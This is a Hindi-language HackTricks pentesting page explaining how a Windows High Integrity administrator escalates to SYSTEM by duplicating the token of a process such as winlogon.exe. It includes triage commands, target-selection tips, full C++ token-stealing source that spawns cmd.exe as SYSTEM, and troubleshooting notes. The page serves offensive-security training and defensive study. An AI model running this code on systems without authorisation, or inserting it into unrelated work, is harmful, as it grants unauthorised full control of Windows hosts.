# High से System तक SeImpersonate

{{#include ../../banners/hacktricks-training.md}}

यह पेज **High Integrity administrator process** से **`NT AUTHORITY\SYSTEM`** तक जाने के **manual** तरीके के बारे में है। इसमें **non-protected SYSTEM process** को **open** करना, उसके token को **duplicate** करना और उस token के साथ एक child process को **spawn** करना शामिल है।

यदि आपके पास केवल **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** है, लेकिन आप किसी उपयुक्त SYSTEM process को **open** नहीं कर सकते, तो **Potato / named-pipe** path आमतौर पर अधिक विश्वसनीय होता है:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

यदि आपका लक्ष्य केवल `SYSTEM` नहीं, बल्कि अधिकतम संभव privileges वाला **SYSTEM token** प्राप्त करना है, तो यह भी देखें:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## त्वरित triage

Token चुराने का प्रयास करने से पहले, context को जल्दी से validate करें:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
व्यावहारिक नोट्स:

- **High Integrity** admin token आमतौर पर **`SeDebugPrivilege` enable करने** और कई non-protected SYSTEM processes को खोलने के लिए पर्याप्त होता है।
- **`CreateProcessWithTokenW` को caller पर `SeImpersonatePrivilege` की आवश्यकता होती है।** यदि यह API `1314` के साथ fail हो, तो SYSTEM primary token को duplicate करने के बाद `CreateProcessAsUserW` पर switch करें।
- आधुनिक Windows पर **`lsass.exe` अक्सर खराब target होता है**, क्योंकि **LSA protection / PPL** administrators को भी `SeDebugPrivilege` के साथ access करने से रोकता है। इसके बजाय **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, या SYSTEM के रूप में चलने वाले किसी शुरुआती **`svchost.exe`** को प्राथमिकता दें।
- हर SYSTEM process का token समान रूप से उपयोगी नहीं होता। यदि आपको SYSTEM मिल जाए, लेकिन कुछ privileges missing दिखें, तो technique को broken मानने के बजाय किसी दूसरे SYSTEM process को आज़माएँ।

## PID सावधानी से चुनें

इस technique को reliably काम कराने का सबसे आसान तरीका है कि ऐसा SYSTEM process **चुनें जिसकी DACL वास्तव में Administrators को process query करने और उसके token को duplicate करने की अनुमति देती हो।**

पहले इन अच्छे candidates को test करें:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- SYSTEM के रूप में चलने वाले कुछ शुरुआती `svchost.exe` instances

Default रूप से इनसे बचें:

- उन hosts पर `lsass.exe` जहाँ **RunAsPPL / LSA protection** enabled हो
- protected / security-sensitive processes, जो `SeDebugPrivilege` enable करने के बाद भी `Access denied` return करते हैं

आप elevated रूप से चलाए गए **Process Explorer** या **Process Hacker** से candidate processes और उनके token/ACLs inspect कर सकते हैं।

### Code

निम्नलिखित code [this access-token article](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962) से लिया गया है। यह **process ID को argument के रूप में स्वीकार करता है** और उस process के **user के रूप में** command shell शुरू करता है।<sup>[[3]](#references)</sup>\
एक **High Integrity** process में चलाते समय आप **System के रूप में चल रहे process का PID indicate कर सकते हैं** (`winlogon`, `wininit` जैसे) और SYSTEM के रूप में `cmd.exe` execute कर सकते हैं।<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## उपयोगी API / access-right notes

Sample `MAXIMUM_ALLOWED` का उपयोग करता है, लेकिन वास्तविक operations के लिए इसमें शामिल minimum components को याद रखना उपयोगी है:

- `OpenProcessToken()` के लिए केवल यह आवश्यक है कि **process handle** को **`PROCESS_QUERY_LIMITED_INFORMATION`** के साथ खोला गया हो।
- `CreateProcessWithTokenW()` का उपयोग करने के लिए **primary token handle** में **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`** होना आवश्यक है।<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` को केवल impersonation token नहीं, बल्कि **primary token** (`TokenPrimary`) बनाना चाहिए।
- यदि आपने पहले ही SYSTEM का impersonation कर लिया है और `CreateProcessWithTokenW()` फिर भी `1314` के साथ fail हो जाता है, तो इसके बजाय `CreateProcessAsUserW()` आज़माएँ।

इसका अर्थ है कि target process को `PROCESS_ALL_ACCESS` के साथ खोलना आमतौर पर अनावश्यक और अधिक noisy होता है; token को query करने के लिए आवश्यक rights का अनुरोध करना पर्याप्त है।

## Error

कुछ occasions पर आप System का impersonation करने का प्रयास कर सकते हैं, लेकिन यह काम नहीं करेगा और निम्नलिखित जैसा output दिखाएगा:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
इसका मतलब है कि भले ही आप High Integrity level पर चल रहे हों, **आपके पास उस target process/token पर पर्याप्त permissions नहीं हैं**।\
आइए **Process Explorer** के साथ `svchost.exe` processes पर वर्तमान Administrator permissions की जाँच करें (आप **Process Hacker** का भी उपयोग कर सकते हैं):

1. `svchost.exe` का एक process चुनें
2. Right Click --> Properties
3. "Security" Tab के अंदर नीचे दाईं ओर "Permissions" button पर क्लिक करें
4. "Advanced" पर क्लिक करें
5. "Administrators" चुनें और "Edit" पर क्लिक करें
6. "Show advanced permissions" पर क्लिक करें

![Code - Error: 6. "Show advanced permissions" पर क्लिक करें](<../../images/image (437).png>)

पिछली image में selected process पर "Administrators" के सभी privileges दिए गए हैं (जैसा कि आप देख सकते हैं, `svchost.exe` के मामले में उनके पास केवल "Query" privileges हैं)

`winlogon.exe` पर "Administrators" के privileges देखें:

![Code - Error: `winlogon.exe` पर "Administrators" के privileges देखें](<../../images/image (1102).png>)

उस process के अंदर "Administrators" "Read Memory" और "Read Permissions" कर सकते हैं, जो संभवतः Administrators को इस process द्वारा उपयोग किए गए token को impersonate करने की अनुमति देता है।

### सामान्य failure causes

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: process DACL आपको block करता है, या target **protected/PPL** है। कोई अन्य SYSTEM process चुनें।
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: आपका token handle पर्याप्त rights के बिना खोला गया था, या target token DACL duplication को रोकता है।
- **`CreateProcessWithTokenW()` -> `1314`**: caller के पास वर्तमान में **`SeImpersonatePrivilege`** enabled नहीं है। पहले इसे enable करने का प्रयास करें या duplicated primary token के साथ `CreateProcessAsUserW()` का उपयोग करें।
- पिछली failures के बाद **`CreateProcessWithTokenW()` -> `1326`**: इसका अक्सर केवल यह अर्थ होता है कि पहले वाला token duplication/impersonation step fail हो गया, इसलिए child process launch करने के लिए कोई usable primary token नहीं है।

## Operator notes

- यह technique तब बहुत उपयोगी है जब आप पहले से ही **local admin + high integrity** हों और किसी service या named-pipe coercion chain को शुरू किए बिना SYSTEM तक पहुँचने का quick, manual path चाहते हों।
- Hardened Windows 11 / Server environments पर **LSA protection increasingly common है**, इसलिए ऐसा workflow जो यह मानता है कि `lsass.exe` हमेशा readable है, brittle होता है। **`winlogon.exe` / `wininit.exe` / `services.exe` आमतौर पर बेहतर first picks हैं**।<sup>[[2]](#references)</sup>
- यदि आपको elevated admin desktop के बजाय **service account** context मिलता है, तो इस page की तुलना में **Potato family** आमतौर पर बेहतर fit होती है।



## References

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Active Directory को LSASS को छुए बिना compromise करने के लिए Windows' tokens का दुरुपयोग](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Process Tokens को समझना और उनका दुरुपयोग करना — Part II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)
{{#include ../../banners/hacktricks-training.md}}
